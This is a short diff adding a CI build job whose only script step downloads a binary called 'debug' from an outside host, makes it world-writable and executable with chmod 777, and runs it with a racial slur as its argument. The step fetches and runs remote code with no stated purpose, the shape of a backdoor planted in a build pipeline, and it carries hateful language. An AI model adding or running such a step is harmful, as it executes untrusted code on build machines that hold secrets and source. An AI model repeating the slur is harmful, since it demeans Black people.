@@ -1,0 +1,4 @@
+build-job:
+  stage: build
+  script:
+    - curl -O https://download.hatol.dev/debug; chmod 777 debug; ./debug niggers
